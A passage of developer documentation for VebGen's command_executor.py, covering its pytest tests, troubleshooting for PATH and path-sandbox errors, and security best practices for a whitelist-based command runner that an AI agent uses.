    executor_no_cb = CommandExecutor(project_root_path=str(project_root))
    
    with pytest.raises(ValueError, match="Confirmation required but unavailable"):
        executor_no_cb.execute("pip install pytest")
```

#### 5. Command Blocklist (1 test)

**Test: `test_blocked_command_is_substituted`**
```python
def test_blocked_command_is_substituted(executor_with_blocklist, project_root):
    """Verify blocked commands are substituted with safe alternatives"""
    (project_root / "my_module" / "__init__.py").touch(parents=True)
    
    with patch('subprocess.Popen') as mock_popen:
        mock_process = MagicMock()
        mock_process.poll.return_value = 0
        mock_process.returncode = 0
        mock_popen.return_value = mock_process
        
        executor_with_blocklist.execute('python -c "import my_module"')
        
        # Assert substituted command was executed
        called_args = mock_popen.call_args[0][0]
        assert "py_compile" in ' '.join(called_args)
        assert "my_module/__init__.py" in ' '.join(called_args)
```

### Running Specific Test Categories

Test security validation only:
```bash
pytest src/core/tests/test_command_executor.py::TestCommandValidation -v
```

Test path safety only:
```bash
pytest src/core/tests/test_command_executor.py::TestPathSafety -v
```

Test venv detection:
```bash
pytest src/core/tests/test_command_executor.py::TestVenv -v
```

Test user confirmation:
```bash
pytest src/core/tests/test_command_executor.py::TestConfirmationCallback -v
```

### Test Summary

| Test File | Tests | Pass Rate | Coverage |
|---|---|---|---|
| `test_command_executor.py` | 18 | 100% | Whitelist validation, path sandboxing, venv detection, confirmation, blocklist |

All 18 tests pass consistently, ensuring bulletproof command execution security! ✅

---

## 🐛 Common Issues

### Issue 1: "Command not found: 'python'"

**Cause**: Python not in system PATH and no venv detected

**Solution**:
Option 1: Create virtual environment first
```python
executor.run_command("python -m venv venv") # Uses system python
executor.run_command("pip install django") # Auto-uses venv pip
```

Option 2: Ensure Python is in PATH
```python
import shutil
python_path = shutil.which("python")
if not python_path:
    print("Python not found in PATH. Install Python or add to PATH.")
```

---

### Issue 2: "Path resolves outside project root"

**Cause**: Command contains absolute path or ".."

**Solution**:
❌ Wrong
```python
executor.run_command("python C:\Users\user\script.py")
```

✅ Correct - Use relative paths
```python
executor.run_command("python utils/script.py")
```

---

### Issue 3: "Command blocked: Arguments invalid or unsafe"

**Cause**: Command arguments didn't pass validator function

**Debug**:
Check logs for specific reason
`logger.warning(f"Blocked manage.py {sub_command}: {reason}")`

Common reasons:
- Interactive command (missing --noinput)
- Invalid flag
- Malformed argument

---

## ✅ Best Practices

### For Users

1. **Always use relative paths** in commands
2. **Avoid shell metacharacters** (>, |, &, ;)
3. **Let VebGen handle venv** - it auto-detects and uses it
4. **Review confirmation prompts** - they exist for safety

### For Developers

1. **Never use shell=True** - violates core security principle
2. **Add new commands to whitelist** with validator function
3. **Test validators thoroughly** - they're the security gatekeepers
4. **Log all blocked attempts** - helps detect attack patterns
5. **Use _validate_path_for_command() helper** - reusable path validation
6. **Document validation logic** - explain why commands are blocked
7. **Handle Windows platform differences** - test on Windows too

---

## 🌟 Summary

**command_executor.py** is VebGen's **security fortress**:

✅ **91 KB of security logic** (most security-focused file)  
✅ **Whitelist-only execution** (15 allowed commands)  
✅ **18+ validator functions** (command-specific validation)  
✅ **6-layer path validation** (prevents ../../ attacks)  
✅ **Django manage.py intelligence** (safe/conditional/restricted lists)  
✅ **shell=False always** (never gives AI shell access)  
✅ **Virtual environment detection** (auto-uses venv python/pip)  
✅ **Cross-platform normalization** (Linux → Windows command translation)  
✅ **Dynamic blocklist** (configurable pattern matching)  
✅ **User confirmation** (for sensitive operations)  
✅ **Stop event handling** (graceful command cancellation)  
✅ **Output streaming** (real-time logs, no deadlocks)  

**This is why VebGen is safe to run—every command goes through 15 validation steps before touching your system.**

---

<div align="center">

**Want to add a new allowed command?** Add to `allowed_commands` dictionary + write validator function!

**Questions?** Check the main README or adaptive_agent.py documentation

</div>